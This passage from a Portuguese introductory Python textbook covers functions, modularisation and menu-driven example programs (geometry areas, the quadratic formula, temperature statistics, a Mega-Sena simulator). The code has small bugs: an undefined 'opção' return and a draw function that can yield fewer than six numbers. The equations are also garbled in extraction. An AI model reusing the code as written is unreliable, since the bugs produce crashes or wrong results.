célula incrementam os valores das somas para as disciplinas. Veja que a linha 7 
soma os valores da primeira coluna (índice 0) e a linha 8 soma os valores da 
segunda coluna (índice 1). As linhas 10 e 11 calculam as médias para cada 
coluna. Nas duas células finais o comando print() é utilizado para exibir os 
resultados com o auxílio do comando round() que arredonda o resultado (aqui 
em 2 casas decimais de acordo com o argumento passado logo após a média). 
 

 
 
 
Da mesma maneira que foi descrito no caso de vetores unidimensionais, 
aqui para os multidimensionais, todas as operações aritméticas são 
perfeitamente aplicáveis desde que os elementos sejam acessados da maneira 
correta por meio de seus índices. O exemplo de média da Figura 3.5 é uma das 
diversas possibilidades de se operar com matrizes. 
 
Nesse ponto do material vale destacar que listas não são a única maneira 
de utilizar estruturas de dados em Python. Existem algumas bibliotecas que 
implementam funcionalidades excepcionais para desempenhar tarefas com 
vetores e matrizes, dentre elas, destaco a Numpy (Harris et al., 2020) que é uma 
biblioteca especialista em álgebra linear. Essa biblioteca é capaz de fazer diveras 
operações matemáticas e facilita bastante o trabalho e por isso é amplamente 
utilizada pelos cientistas de dados. 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 4 MODULARIZAÇÃO 
 
Chegamos no ponto em que boa parte dos conceitos de algoritmos e 
lógica de programação foram explorados. Agora é hora de juntar todos esses 
elementos de forma a tornar os códigos mais padronizados. Nessa unidade, 
exploraremos os princípios da modularização de códigos. Tornar os códigos 
modulares facilita muito sua manutenção e seu entendimento, além de deixar os 
algoritmos mais organizados. 
 
OBJETIVOS DA UNIDADE 4 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar algoritmos modulares por meio de funções 
 
• Utilizar as funções para realizar operações e tarefas específicas  

 
 
4.1. REAPROVEITAMENTO DE CÓDIGO E DEFINIÇÃO DE UMA FUNÇÃO 
 
Em diversos casos ao desenvolver algoritmos certos tipos de tarefas são 
repetitivas e aparecem diversas vezes ao longo do código. A repetição de 
instruções que fazem a mesma coisa pode ser vista como um desperdício de 
tempo e de código. Criar uma função que executa uma tarefa e acionar essa 
função sempre que necessário é mais inteligente, visto que propicia uma 
organização melhor no código além de economizar linhas escritas e facilitar a 
alteração da lógica em questão. Uma segunda maneira de enxergar a questão 
da modularização é a divisão de tarefas complexas em várias tarefas menores. 
Dessa forma, fica mais fácil fazer reparos no código e entender a lógica como 
um todo. A título de exemplo, imagine um sistema que calcula uma taxa referente 
a um pagamento. Essa taxa é utilizada em várias partes do sistema e por isso, 
caso o cálculo fosse escrito em todos esses pontos separadamente, imagine a 
dor de cabeça para alterar no caso de mudança do percentual dessa taxa. Cada 
ponto do código deveria ser editado. O primeiro e mais comum problema nesse 
caso é o esquecimento de edição em um determinado ponto do sistema. Por 
outro lado, se uma função para realizar o cálculo for implementada, e chamada 
nesses diversos pontos do sistema, em caso de alteração do percentual da taxa, 
basta mudar dentro da função, uma vez que sua chamada permaneceria a 
mesma. Fazendo uma outra analogia, a função é como um motor, que será 
modificado em seu interior, o restante do carro não se interessa pelo motor em 
si, apenas faz uso dele. 
Em Python, uma função pode ser definida pela palavra reservada def 
seguida pelo nome da função e os parêntesis que irão delimitar os argumentos 
solicitados pela função. A Figura 4.1 abaixo ilustra a definição e utilização de 
uma função simples para calcular a soma de 3 números. 

 
 
 
Figura 4.1: Definição de uma função que soma três números e retorna o 
resultado 
 
A primeira linha da primeira célula na Figura 4.1 define a função e tudo 
que está entre os parêntesis são parâmetros que devem ser fornecidos à função 
para que ela possa ser utilizada. A linha 3 realiza o cálculo, que na prática é a 
tarefa principal dessa função. Finalmente na linha 5 temos a palavra reservada 
return que indica que a função irá retornar a soma calculada. Uma função não 
necessariamente precisa ter um retorno, ela pode simplesmente realizar uma 
tarefa e imprimir o resultado. A segunda célula faz a chamada à função, 
passando três números para que ela realize a soma (5, 1 e 9). Finalmente, a 
última célula imprime o resultado da função que foi armazenado na variável 
soma. Um detalhe importante a esclarecer é que tudo que está dentro da função 
só existe quando ela executa sua tarefa, ou seja, se por acaso, após o cálculo 
da soma dos números não houvesse o retorno, não seria possível obter o 
resultado pois. Além disso, a variável soma definida dentro da função é 
independente da variável soma da segunda célula na qual a função foi chamada. 
Na verdade, o resultado poderia ter qualquer outro nome, soma é obviamente 
mais intuitivo. 
 

 
 
4.2. IMPLEMENTAÇÃO DE CÁLCULOS MATEMÁTICOS POR MEIO DE 
FUNÇÕES 
 
 
Funções são excelentes ferramentas para implementar cálculos 
matemáticos e organizar o racional. Imagine o cálculo de área das diversas 
figuras geométricas existentes. Por exemplo, uma das maneiras estudadas na 
escola para calcular a área de um triângulo é por meio da Equação 4.1 abaixo. 
 
𝐴=
".*
(                                            Equação 4.1 
Nessa equação b é o comprimento da base e h é o valor da altura do 
triângulo. Um outro exemplo interessante é o cálculo da área de um círculo que 
pode ser realizado por meio da Equação 4.2 abaixo. 
 
𝐴= 𝜋𝑟(                                         Equação 4.2 
Nessa equação 𝜋 é a famosa constante matemática que possui o valor 
aproximado de 3,14 e r é o comprimento do raio. A Figura 4.2 apresenta um 
trecho de código que implementa as funções. 
 
 
Figura 4.2: Implementação de funções para cálculo de área de figuras 
geométricas 

 
 
A linha 1 da primeira célula mostrada na Figura 4.2 importa a biblioteca 
math. A função que calcula a área do triângulo é definida da linha 3 até a linha 7 
e a função que calcula a área do círculo vai da linha 9 até a linha 13. Observe as 
operações matemática realizadas nas linhas 5 e 11 da primeira célula, com 
destaque para a linha 11 que faz uso da biblioteca math e define o pi por meio 
de math.pi. A segunda célula faz a chamada às duas funções (linha 1 e linha 2) 
armazenando os resultados dos cálculos das áreas nas variáveis area_triangulo 
e area_circulo respectivamente. A última célula imprime os resultados. Um ponto 
que chama a atenção é a nomenclatura das funções. Perceba que não pode 
haver espaços e por isso o uso do símbolo _ para separar as palavras. Além 
disso, não se utilizam acentos ou cedilha em nomes de funções. 
 
4.3. UTILIZANDO FUNÇÕES DENTRO DE FUNÇÕES 
 
Funções podem ser utilizadas umas dentro das outras. Isso é uma prática 
muito comum. Aproveitando os exemplos construídos na seção 4.2, vamos 
implementar uma função um pouco mais complexa que utiliza as outras funções 
para cálculo de área. Imagine uma função mais abrangente que calcula a área 
de uma figura geométrica dado seu nome. Veja a Figura 4.3 abaixo. 
 

 
 
 
Figura 4.3: Implementação de uma função que utiliza duas outras funções 
 
 
A partir da linha 15 na exibida na Figura 4.3 é implementada a função 
calcular_area que é mais abrangente e solicita o nome da figura e suas 
dimensões. Com base nisso ela faz a chamada à uma das duas outras funções 
implementadas anteriormente. Obviamente essa função é mais complexa e 
exige um aprofundamento maior do leitor, mas nada impossível. Em primeiro 
lugar, na linha 15, a definição da função faz uso de elementos padrão (default) 
para as dimensões. Isso garante que se a chamada for para calcular a área do 
círculo, os parâmetros de base e altura não precisam ser preenchidos, não 
causando um erro por falta de parâmetros a serem inseridos. Além disso, a 
função utiliza estruturas de decisão, já explicadas anteriormente, para validar o 
nome da figura (linha 17 e linha 23) e qual o cálculo correto a ser feito. 

 
 
Além disso, uma vez escolhida a figura, é necessário testar se as 
dimensões fornecidas são diferentes de 0. Veja, não faz sentido calcular área de 
uma figura que não possui dimensões. Outra questão é a inversão de 
parâmetros, no caso de solicitar o nome círculo e passar as dimensões de 
triângulo. Todos esses detalhes necessitam de validação e os comandos if, elif 
e else ajudam a tratar. As linhas 22 e 28 imprimem mensagens nos casos em 
que há falta de dimensões para calcular a área das figuras. Os testes para 
verificar se as dimensões são diferentes de zero (!=) são feitos nas linhas 18 e 
24. 
Esse uso de funções torna o código bastante organizado e modular, uma 
vez que deixa tarefas bem delimitadas para cada função. O leitor deve avançar 
nos estudos de funções para conseguir implementar lógicas ainda mais 
complexas e obviamente úteis à sua rotina. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 5 PROJETO DE ALGORITMO 
 
Nessa unidade daremos sequência ao estudo da lógica de programação 
de forma a consolidar todo o conhecimento visto nas unidades anteriores. A ideia 
é utilizar as estruturas aprendidas, criar módulos e implementar algoritmos um 
pouco mais complexos. 
 
OBJETIVOS DA UNIDADE 5 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar algoritmos mais complexos que resolvam problemas 
 
• Aplicar diversos conceitos de lógica de programação de maneira mais 
integrada 
 

 
 
5.1. ESTUDO DE PROBLEMAS 
 
O estudo de lógica de programação e algoritmos culmina inevitavelmente 
na solução de diversos tipos de problemas e situações. É comum a 
implementação de soluções ser precedida por uma etapa de modelagem na qual 
são discutidas metodologias e abordagens. Em especial para algoritmos e 
linguagens de programação existe uma etapa de construção de diagramas que 
são bastante úteis para visualizar o fluxo de operação do sistema. Isso não será 
abordado nesse texto, mas recomenda-se que o leitor procure materiais a 
respeito. 
 
5.2. DESENVOLVIMENTO DE PROJETOS DE ALGORITMOS 
 
Para ilustrar um primeiro exemplo, vamos juntar alguns raciocínios das 
unidades anteriores. Na seção 4.2 algumas funções foram implementadas para 
calcular a área de figuras planas. Vamos expandir um pouco o racional para um 
pequeno sistema que é capaz de calcular a área de qualquer uma das principais 
figuras estudadas na geometria plana: quadrilátero, triângulo, círculo, trapézio e 
losango. Além disso, esse sistema também é capaz de calcular as raízes de uma 
equação do segundo grau. E por fim, ele também é capaz de calcular a distância 
entre dois pontos representados em um plano cartesiano. Esse sistema precisa 
de um menu inicial que apresenta as opções ao usuário e, de acordo com a 
escolha, irá realizar o cálculo solicitado e imprimir a resposta. O trecho de código 
abaixo ilustra a implementação completa desse pequeno sistema. 
 
import math 
 
def calcular_area_do_triangulo(base, altura): 
    area = (base * altura) / 2 
 
    return round(area, 2) 
 
 
 
 

 
 
def calcular_area_do_circulo(raio): 
    area = math.pi * raio ** 2 
 
    return round(area, 2) 
 
def calcular_area_do_trapezio(base_maior, base_menor, altura): 
    area = ((base_maior + base_menor) * altura) / 2 
 
    return round(area, 2) 
 
def calcular_area_do_losango(diagonal_maior, diagonal_menor): 
    area = (diagonal_maior * diagonal_menor) / 2 
 
    return round(area, 2) 
 
def calcular_area_do_quadrilatero(lado1, lado2): 
    area = lado1 * lado2 
 
    return round(area, 2) 
 
def calcular_raizes_bhaskara(a, b, c): 
    delta = b ** 2 - 4 * a * c 
 
    if delta > 0: 
        print('A equação possui duas raízes reais distintas!\n') 
        x1 = (- b + math.sqrt(delta)) / (2 * a) 
        x2 = (- b - math.sqrt(delta)) / (2 * a) 
        print('O resultado é:') 
        print(f'x1 = {round(x1, 2)}') 
        print(f'x2 = {round(x2, 2)}') 
    elif delta == 0: 
        print('A equação possui duas raízes reais iguais!\n') 
        x1 = (- b + math.sqrt(delta)) / (2 * a) 
        x2 = x1 
        print('O resultado é:') 
        print(f'x1 = {round(x1, 2)}') 
        print(f'x2 = {round(x2, 2)}') 
    else: 
        print('A equação não possui raízes reais!\n') 
        x1_real = - b / (2 * a) 
        x1_imaginario = math.sqrt(-delta) / (2 * a) 
        x2_real = - b / (2 * a) 
        x2_imaginario = - math.sqrt(-delta) / (2 * a) 
        print('O resultado é:') 
        print(f'x1 = {x1_real}+{x1_imaginario}i') 
        print(f'x2 = {x2_real}{x2_imaginario}i') 
 
def calcular_distancia_entre_dois_pontos(x1, y1, x2, y2): 
    distancia = math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2) 
 
    return round(distancia, 2) 
 
 
 
 
 
 
 
 
 

 
 
def menu(): 
    print( 
        '\n 0 - Encerrar \n 1 - Triângulo \n 2 - Círculo \n 3 - 
Trapézio \n 4 - Losango \n 5 - Quadrilátero \n 6 - Bháskara \n 7 - 
Distância entre dois pontos') 
 
    opcao = int(input('Informe a opção desejada:')) 
 
    return opção 
 
def executar_algoritmo(): 
    while True: 
 
        opcao = menu() 
 
        if opcao == 1: 
            base = float(input('Insira o valor da base:')) 
            altura = float(input('Insira o valor da altura:')) 
            print('\n') 
            area = calcular_area_do_triangulo(base, altura) 
            print(f'A área do triângulo é: {area}\n') 
        elif opcao == 2: 
            raio = float(input('Insira o valor do raio:')) 
            print('\n') 
            area = calcular_area_do_circulo(raio) 
            print(f'A área do círculo é: {area}\n') 
        elif opcao == 3: 
            base_maior = float(input('Insira o valor da base maior:')) 
            base_menor = float(input('Insira o valor da base menor:')) 
            altura = float(input('Insira o valor da altura:')) 
            print('\n') 
            area = calcular_area_do_trapezio(base_maior, base_menor, 
altura) 
            print(f'A área do trapézio é: {area}\n') 
        elif opcao == 4: 
            diagonal_maior = float(input('Insira o valor da diagonal 
maior:')) 
            diagonal_menor = float(input('Insira o valor da diagonal 
menor:')) 
            print('\n') 
            area = calcular_area_do_losango(diagonal_maior, 
diagonal_menor) 
            print(f'A área do losango é: {area}\n') 
        elif opcao == 5: 
            lado1 = float(input('Insira o valor do lado 1:')) 
            lado2 = float(input('Insira o valor do lado 2:')) 
            print('\n') 
            area = calcular_area_do_quadrilatero(lado1, lado2) 
            print(f'A área do quadrilátero é: {area}\n') 
        elif opcao == 6: 
            a = float(input('Insira o valor de a:')) 
            b = float(input('Insira o valor de b:')) 
            c = float(input('Insira o valor de c:')) 
            print('\n') 
            calcular_raizes_bhaskara(a, b, c) 
        elif opcao == 7: 
            x1 = float(input('Insira o valor de x1:')) 
            y1 = float(input('Insira o valor de y1:')) 
            x2 = float(input('Insira o valor de x2:')) 
            y2 = float(input('Insira o valor de y2:')) 

 
 
            print('\n') 
            distancia = calcular_distancia_entre_dois_pontos(x1, y1, 
x2, y2) 
            print(f'A distância entre os dois pontos é: 
{distancia}\n') 
        elif opcao == 0: 
            print('\n') 
            print('Sistema encerrado!\n') 
            break 
 
        else: 
            print('\n') 
            print('Opção inválida!\n') 
            print('Sistema encerrado!\n') 
            break 
 
executar_algoritmo() 
 
O trecho de código acima é todo modularizado, o que facilita o 
entendimento e a organização. Em primeiro lugar, existe uma função para 
calcular a área de cada uma das figuras planas descritas. Na sequência, uma 
função para calcular as raízes de uma equação do segundo grau por meio da 
fórmula de Bháskara é implementada. Por fim, uma função que calcula a 
distância entre dois pontos no plano cartesiano fecha a principal ideia desse 
algoritmo, que é ter uma função para fazer cada tarefa. Perceba que cada uma 
das funções citadas possui seus argumentos, de acordo com o cálculo 
executado. Na sequência existe uma função menu() que tem o objetivo de 
apresentar as opções disponíveis ao usuário, coletar a escolha e retornar. 
Finalmente, a função executar_algoritmo() direciona a opção escolhida para uma 
sequência de if-elif-else que irão fazer as chamadas às funções corretas, calcular 
o que está sendo solicitado e imprimir os resultados. Todo o sistema funciona 
dentro de um while (utilizando o True) que permanece em execução constante 
até que a opção 0 seja digitada para encerrar ou uma opção inválida seja 
inserida. Essas paradas são feitas por meio do comando break. A Figura 5.1 
abaixo mostra o menu de opções do algoritmo e sua saída. 
 

 
 
 
Figura 5.1: Menu principal do algoritmo e saída de resultado da área do 
triângulo 
 
Observe que na parte superior da Figura 5.1 a opção 1 foi digitada no 
menu de opções e na sequência os valores 5 e 6 foram inseridos. Por fim a área 
do triângulo é exibida. O menu principal aparece novamente aguardando uma 
nova opção. A Figura 5.2 abaixo ilustra a escolha 6 que leva ao uso da fórmula 
de Bháskara. É possível ver que os valores de x1 e x2, que são as raízes da 
equação, são números complexos. 
 

 
 
 
Figura 5.2: Menu principal do algoritmo e saída de resultado para as raízes da 
equação de segundo grau 
 
O menu principal continua sendo exibido aguardando uma opção até que 
0 seja digitado para encerrar o sistema ou então uma opção inválida ser digitada, 
que também leva ao encerramento. 
 
Vamos analisar agora um exemplo disponível em (Farrer et al., 1999) no 
enunciado abaixo. 
Em uma cidade do interior, sabe-se que, de janeiro a abril de 1976 (121) 
dias, não ocorreu temperatura inferior a 15°C nem superior a 40°C. Fazer um 
algoritmo que calcule e imprima: 
• A menor temperatura ocorrida 
• A maior temperatura ocorrida 
• A temperatura média 
• O número de dias nos quais a temperatura foi inferior à temperatura 
média 

 
 
O trecho de código abaixo implementa toda a lógica para esse algoritmo. 
 
import random 
 
temperaturas = [] 
for i in range(121): 
    temperaturas.append(random.randint(15, 40)) 
 
def calcular_media_de_temperatura(temperaturas): 
    soma = 0 
 
    for temp in temperaturas: 
        soma += temp 
 
    media = soma / len(temperaturas) 
 
    return round(media, 2) 
 
def calcular_dias_abaixo_da_media(temperaturas): 
    temperatura_media = calcular_media_de_temperatura(temperaturas) 
 
    contador = 0 
 
    for temp in temperaturas: 
        if temp < temperatura_media: 
            contador += 1 
 
    return contador 
 
def menu(): 
    print( 
        '\n 0 - Encerrar \n 1 - Menor temperatura \n 2 - Maior 
temperatura \n 3 - Temperatura média \n 4 - Quantidade de dias com 
temperatura abaixo da média \n') 
 
    opcao = int(input('Informe a opção desejada:')) 
 
    return opcao 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
def executar_analise_temperaturas(): 
    while True: 
 
        opcao = menu() 
 
        if opcao == 1: 
            menor_temperatura = min(temperaturas) 
            print('\n') 
            print(f'A menor temperatura é: {menor_temperatura}\n') 
        elif opcao == 2: 
            maior_temperatura = max(temperaturas) 
            print('\n') 
            print(f'A maior temperatura é: {maior_temperatura}\n') 
        elif opcao == 3: 
            temperatura_media = 
calcular_media_de_temperatura(temperaturas) 
            print('\n') 
            print(f'A temperatura média é: {temperatura_media}\n') 
        elif opcao == 4: 
            temperatura_abaixo_da_media = 
calcular_dias_abaixo_da_media(temperaturas) 
            print('\n') 
            print(f'Houveram {temperatura_abaixo_da_media} com 
temperatura abaixo da média\n') 
        elif opcao == 0: 
            print('\n') 
            print('Sistema encerrado!\n') 
            break 
        else: 
            print('\n') 
            print('Opção inválida!\n') 
            print('Sistema encerrado!\n') 
            break 
 
executar_analise_temperaturas() 
 
Esse algoritmo utiliza o conceito de geração de números aleatórios. Veja 
na primeira linha do código a importação da biblioteca random. São gerados 121 
números aleatórios entre 15 e 40. Todos esses números são adicionados a uma 
lista de temperaturas. A sequência é muito parecida com o exemplo anterior dos 
cálculos matemáticos. Algumas funções são criadas para modularizar o código. 
Uma função menu direciona o que o usuário pode fazer e a última função junta 
toda a lógica para executar o algoritmo. As figuras abaixo (Figura 5.3 e Figura 
5.4) ilustram algumas operações com o algoritmo. 
 
 
 
 

 
 
 
Figura 5.2: Menu principal do algoritmo de temperaturas e saída de resultado 
para a temperatura mínima 
 
 
Figura 5.3: Menu principal do algoritmo de temperaturas e saída de resultado 
para temperaturas abaixo da média 
 
 
 
 
 

 
 
Vamos analisar a situação a seguir. Precisamos implementar um 
algoritmo que solicite ao usuário para inserir números inteiros. O processo de 
inserção finaliza quando o usuário digita 0 (isso é verificado por meio de um if). 
De posse dos valores digitados em uma lista é possível verificar a quantidade de 
elementos inseridos e a média dos elementos. Veja o trecho de código abaixo. 
 
import random 
 
def calcular_media_de_valores(lista_valores): 
    soma = 0 
 
    for item in lista_valores: 
        soma += item 
 
    media = soma / len(lista_valores) 
 
    return round(media, 2) 
 
def menu(): 
    print( 
        '\n 0 - Encerrar \n 1 - Inserir valores \n 2 - Quantidade de 
valores inseridos \n 3 - Média dos valores inseridos \n') 
 
    opcao = int(input('Informe a opção desejada:')) 
 
    return opcao 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
def executar(): 
    lista_numeros = [] 
 
    while True: 
 
        opcao = menu() 
 
        if opcao == 1: 
            execucao = True 
            while execucao: 
                variavel = int(input('Insira um número inteiro')) 
                if variavel != 0: 
                    lista_numeros.append(variavel) 
                else: 
                    execucao = False 
                    print('\n') 
                    print('Inserção de números encerrada!\n') 
        elif opcao == 2: 
            quantidade_valores_inseridos = len(lista_numeros) 
            print('\n') 
            print(f'Foram inseridos {quantidade_valores_inseridos} 
valores\n') 
        elif opcao == 3: 
            media = calcular_media_de_valores(lista_numeros) 
            print('\n') 
            print(f'A média dos valores inseridos é: {media}\n') 
        elif opcao == 0: 
            print('\n') 
            print('Sistema encerrado!\n') 
            break 
        else: 
            print('\n') 
            print('Opção inválida!\n') 
            print('Sistema encerrado!\n') 
            break 
 
executar() 
 
A ideia desse algoritmo é muito semelhante aos exemplos apresentados 
anteriormente. Aqui existe um detalhe a mais que é a utilização de um while 
dentro do while principal. Isso se deve ao fato de o algoritmo ser dinâmico e 
permitir o usuário digitar quantos números ele desejar até inserir o 0. Esse fato 
de inserir de maneira dinâmica se deve ao comportamento das listas em Python 
que suportam a adição de elementos por meio do método append(). As figuras 
abaixo ilustram o menu do algoritmo e sua operação para facilitar o entendimento 
do leitor. 
 
 
 

 
 
 
Figura 5.4: Menu principal do algoritmo de inserção de valores 
 
 
Figura 5.5: Menu principal do algoritmo de inserção de valores e contagem da 
quantidade de elementos digitados 
 
 
 
 
 
 

 
 
 
Figura 5.6: Menu principal do algoritmo de inserção de valores e cálculo da 
média dos valores inseridos 
 
A Figura 5.4 mostra a escolha da opção 1 no menu principal e a inserção 
de cinco número inteiros (4, 8, 12, 3, 1). Na Figura 5.5 a opção 2 foi escolhida e 
o algoritmo exibe a contagem de números digitados (5). Finalmente na Figura 
5.6 a média dos valores digitados é exibida. 
 
Um outro exemplo muito interessante que pode ser implementado é um 
gerador de números aleatórios para simular a Mega-Sena. O código abaixo 
mostra a implementação. 
 
import random 
 
def inserir_numeros_no_volante(): 
    numeros = [] 
    executar = True 
 
    while executar: 
 
        numero = int(input('Insira um número:')) 
 
        if numero >= 1 and numero <= 60 and numero not in numeros: 
            numeros.append(numero) 
 
            if len(numeros) == 6: 
                executar = False 
                print('Obrigado por inserir os 6 números!\n') 
        else: 
            print('Número digitado inválido! Digite novamente!\n') 
            print('Lembre-se que o número deve estar entre 1 e 60 e 
não ter sido inserido anteriormente.\n') 

 
 
 
    return numeros 
 
def sortear_numeros(): 
    numeros = [] 
 
    for i in range(6): 
        numero_sorteado = random.randint(1, 60) 
        if numero_sorteado not in numeros: 
            numeros.append(numero_sorteado) 
 
    return numeros 
 
def conferir_numeros_jogados_e_sorteados(numeros_jogados, 
numeros_sorteados): 
    acertos = [] 
 
    for numero in numeros_sorteados: 
        if numero in numeros_jogados: 
            acertos.append(numero) 
 
    return acertos 
 
def menu(): 
    print('ALGORITMO DA MEGA SENA\n') 
 
    print('\n 0 - Encerrar \n 1 - Inserir números no volante \n 2 - 
Realizar sorteio \n 3 - Conferir acertos \n') 
 
    opcao = int(input('Informe a opção desejada:')) 
 
    return opcao 
 
def executar_mega_sena(): 
    numeros_jogados = [] 
    numeros_sorteados = [] 
 
    while True: 
 
        opcao = menu() 
 
        if opcao == 1: 
            if len(numeros_sorteados) > 0: 
                print('O sorteio já foi realizado! Você não pode jogar 
após o sorteio!\n') 
                numeros_sorteados = [] 
            else: 
                numeros_jogados = inserir_numeros_no_volante() 
                print('\n') 
                print(f'Os números jogados são: {numeros_jogados}\n') 
        elif opcao == 2: 
            numeros_sorteados = sortear_numeros() 
            print('\n') 
            print(f'Os números sorteados são: {numeros_sorteados}\n') 
        elif opcao == 3: 
            if len(numeros_jogados) == 0: 
                print('Você ainda não jogou nenhum número!\n') 
            elif len(numeros_sorteados) == 0: 
                print('O sorteio ainda não foi realizado!\n') 
            else: 

 
 
                acertos = 
conferir_numeros_jogados_e_sorteados(numeros_jogados, 
numeros_sorteados) 
                print('\n') 
                if len(acertos) > 0: 
                    if len(acertos) == 6: 
                        print('Parabéns! Você acertou todos os 
números!\n') 
                        print(acertos) 
                    else: 
                        print(f'Os números jogados que foram sorteados 
são: {acertos}\n') 
                else: 
                    print('Não houveram acertos!\n') 
        elif opcao == 0: 
            print('\n') 
            print('Sistema de jogo encerrado!\n') 
            break 
        else: 
            print('\n') 
            print('Opção inválida!\n') 
            print('Sistema de jogo encerrado!\n') 
            break 
 
executar_mega_sena() 
 
O algoritmo apresentado acima utiliza a mesma lógica dos demais 
ilustrados nessa unidade 5 no que se refere à construção de um menu de 
opções. Além disso, é importante analisar algumas validações feitas aqui como 
não permitir que um número que já foi sorteado pelo método random() apareça 
novamente no sorteio. Outro ponto importante é não deixar o usuário escolher 
números repetidos, que seria o equivalente a marcar apenas 5 números no 
volante em uma lotérica na vida real. Também não deve ser permitido marcar 
números imediatamente após o sorteio. 
 

 
 
 
Figura 5.7: Menu principal do algoritmo da Mega-Sena mostrando a escolha 
dos seis números 
 
 
Figura 5.8: Menu principal do algoritmo da Mega-Sena mostrando os números 
sorteados 

 
 
 
Figura 5.9: Menu principal do algoritmo da Mega-Sena e a conferência dos 
resultados 
 
As figuras acima (Figura 5.7, Figura 5.8 e Figura 5.9) mostram o menu do 
algoritmo e a seleção das opções de inserção de números, sorteio e comparação 
entre jogado e sorteado. A opção 3 em especial, avalia se existe uma lista com 
valores de sorteio da Mega-Sena e caso contrário solicita que um sorteio seja 
realizado. De posse dos valores do sorteio, uma comparação é feita por meio de 
um laço for que percorre os valores sorteados e verifica se eles existem na lista 
de valores que foram jogados (selecionados) pelo usuário. Quando não existe 
nenhum elemento igual entre os dois conjuntos o sistema exibe a mensagem de 
que não houve acertos (Figura 5.9). 
 

 
 
 
Figura 5.10: Menu principal do algoritmo da Mega-Sena mostrando a escolha 
de encerrar o sistema 
 
Finalmente, a Figura 5.10 acima mostra a mensagem de encerramento do 
sistema após escolher a opção 0. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
5.3. EXERCÍCIOS 
 
Implemente os exemplos abaixo: 
 
1 - Em matemática, sequências de números são estudas exaustivamente e duas 
em especial merecem destaque: A progressão aritmética (PA) e a progressão 
geométrica (PG). Implemente um algoritmo que possua um menu no qual o 
usuário escolha com qual dessas duas sequências ele deseja trabalhar. O menu 
deve possuir uma maneira de sair ao digitar 0. Uma vez escolhida a PA ou a PG 
o usuário deve ser capaz de digitar quantos números ele quiser para formar uma 
PA ou uma PG. Finalmente, após a inserção dos números, uma mensagem 
aparece solicitando ao usuário para digitar uma posição futura para que o 
sistema calcule qual número irá ocupar tal posição (de acordo com a teoria de 
PA e PG). 
 
2 - Implemente um algoritmo para cadastrar funcionários de uma empresa 
fictícia. O algoritmo deve possuir um menu que exibe as seguintes opções: 
Cadastrar funcionário 
Exibir os nomes dos funcionários cadastrados 
Exibir o funcionário com maior salário 
Exibir o funcionário com o menor salário 
Sair do sistema 
Na parte de cadastro de usuário o sistema deve solicitar o nome e o salário e 
armazenar em listas (uma para o nome e outra para o salário). Na parte de 
exibição dos nomes cadastrados, basta imprimir cada elemento da lista de 
nomes. Para exibir o funcionário com o maior e com o menor salário, basta 
avaliar a lista de salários, obter o índice do valor (maior ou menor em cada caso) 
e buscar o nome na outra lista que possui o mesmo índice para finalmente 
imprimir na tela. O usuário deve digitar 0 para sair do sistema. O sistema deve 
ser implementado utilizando uma lógica que permita que o usuário cadastre 
quantos funcionários desejar (while), ou seja, o sistema só encerra após a 
digitação do 0. 
 

 
 
3 - Implemente um algoritmo que seja capaz de calcular o volume dos principais 
sólidos geométricos (cubo, paralelepípedo, cilindro, pirâmide e esfera). Deve ser 
implementada uma função para o cálculo de volume de cada figura. Além disso, 
construa um menu para que o usuário possa escolher uma opção de cálculo. 
Siga o exemplo apresentado na seção 5.2 para o cálculo da área das figuras 
planas. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
FINALIZAR 
 
Após a leitura desse material, espero que o aprendizado dos conceitos 
relacionados à lógica de programação esteja mais fácil. Essa foi uma introdução 
ao assunto e já habilita o leitor a implementar seus primeiros exemplos. 
As técnicas utilizadas nesse material são básicas e de caráter educativo, 
visto que o leitor precisa se familiarizar com os conteúdos e amadurecer aos 
poucos para conseguir compreender tópicos mais complexos. Além disso, 
existem diversos conceitos relacionados à qualidade de código e boas práticas 
de programação que o leitor precisa buscar para produzir sistemas de qualidade. 
Espero que esse material tenha despertado a curiosidade no leitor para 
continuar investigando esse mundo maravilhoso dos algoritmos e se aprofundar. 
A área de tecnologia é gigante e sempre necessita de bons profissionais, o que 
serve de incentivo para o leitor estar sempre ativo nos estudos. Busque novas 
tecnologias e aprendizados. Parabenizo o esforço empregado até aqui e convido 
o leitor a mergulhar de cabeça nos estudos pois vale a pena. 
Prof. Dr. Thiago Santana Lemes 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
Sobre o autor 
 
Thiago Santana Lemes é doutor em Engenharia Elétrica e de Computação pela 
Universidade Federal de Goiás (UFG), Cientista de dados na Ernst Young (EY). 
Experiência docente no ensino básico atuando na disciplina de matemática e nos 
cursos de Engenharia e Sistemas de Informação atuando nas disciplinas de 
cálculo diferencial, álgebra linear, cálculo numérico, equações diferenciais, 
probabilidade e estatística, algoritmos dentre outras. Desenvolve pesquisas na 
área de inteligência artificial com modelos de Machine Learning (implementação 
de modelos de regressão, classificação e recomendação), Deep Learning (redes 
convolucionais, redes recorrentes) e modelos de otimização (algoritmos 
genéticos e modelos lineares). 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
Farrer, H., Becker, C. G., Faria, E. C., Matos, H. F. de, Santos, M. A. dos, & Maia, 
M. L. (1999). Algoritmos Estruturados (3rd ed.). LTC. 
Harris, C. R., Millman, K. J., van der Walt, S. J., Gommers, R., Virtanen, P., 
Cournapeau, D., Wieser, E., Taylor, J., Berg, S., Smith, N. J., Kern, R., Picus, 
M., Hoyer, S., van Kerkwijk, M. H., Brett, M., Haldane, A., del Río, J. F., 
Wiebe, M., Peterson, P., … Oliphant, T. E. (2020). Array programming with 
NumPy. Nature, 585(7825), 357–362. https://doi.org/10.1038/s41586-020-
2649-2 
Lambert, K. A. (2022). Fundamentos de Python (1st ed.). Cengage Learning. 
Manzano, J. A. N. G., & Oliveira, J. F. de. (2019). Algoritmos (29th ed.). Érica. 
Mueller, J. P. (2020). Começando a Programar em Python Para Leigos (2nd ed.). 
Alta Books. 
  


--- Fim do arquivo: eBook - Lógica de Programação.pdf ---

